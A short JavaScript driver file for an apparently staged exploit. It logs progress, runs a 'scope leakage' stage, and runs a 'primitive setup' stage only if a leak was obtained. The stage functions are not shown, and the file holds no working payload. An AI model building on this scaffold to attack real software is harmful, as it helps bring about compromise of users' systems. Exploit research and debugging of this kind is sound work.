// main.js - Instrumented version
log("=== EXPLOIT INITIALIZATION ===", 'info');

try {
    log("Starting stage 1: scope leakage", 'info');
    pirim_stage1();
    
    if (leak !== null) {
        log("Starting stage 2: primitive setup", 'info');
        pirim_stage2();
    } else {
        log("Skipping stage 2 due to stage 1 failure", 'warn');
    }
} catch (e) {
    log(`Top-level error: ${e}\nStack: ${e.stack}`, 'error');
}

log("=== EXPLOIT COMPLETED ===", 'info');